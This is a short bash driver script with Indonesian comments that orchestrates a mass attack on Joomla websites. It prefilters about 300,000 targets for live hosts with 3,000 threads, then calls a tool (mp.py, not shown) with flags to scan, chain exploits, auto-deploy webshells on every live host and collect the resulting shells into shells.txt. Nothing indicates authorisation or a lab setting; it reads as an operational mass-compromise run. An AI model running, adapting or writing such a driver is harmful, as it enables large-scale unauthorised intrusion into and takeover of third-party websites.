#!/usr/bin/env bash
# Driver run nyata: tahap 1 saring host hidup, tahap 2 scan+exploit+webshell.
# Hasil shell -> shells.txt (permintaan operator).
set -u
cd "$(dirname "$0")"
LOG=run_live.log
: > "$LOG"
say(){ echo "[$(date +%H:%M:%S)] $*" | tee -a "$LOG"; }

ALIVE=joomla-alive.txt
if [ -s "$ALIVE" ]; then
  say "tahap 1 dilewati: $ALIVE sudah ada ($(wc -l < "$ALIVE") target)"
else
  say "TAHAP 1/2 pra-filter TCP 300k target..."
  python3 -u mp.py --targets joomla.txt --cluster joomla --preflight-only \
      --preflight-threads 3000 --preflight-out "$ALIVE" --no-color >> "$LOG" 2>&1
  say "tahap 1 selesai: $(wc -l < "$ALIVE" 2>/dev/null || echo 0) host hidup"
fi

N=$(wc -l < "$ALIVE" 2>/dev/null || echo 0)
if [ "$N" -eq 0 ]; then say "tidak ada host hidup — berhenti"; exit 1; fi

say "TAHAP 2/2 scan + exploit + webshell pada $N host hidup..."
python3 -u mp.py --targets "$ALIVE" --cluster joomla --chain \
    --i-know-what-im-doing -t 100 --timeout 8 --no-preflight \
    --auto-deploy --shell-out shells.txt -o hasil-scan.txt --no-color >> "$LOG" 2>&1
say "SELESAI. shell: $(grep -vc '^#' shells.txt 2>/dev/null || echo 0) baris"
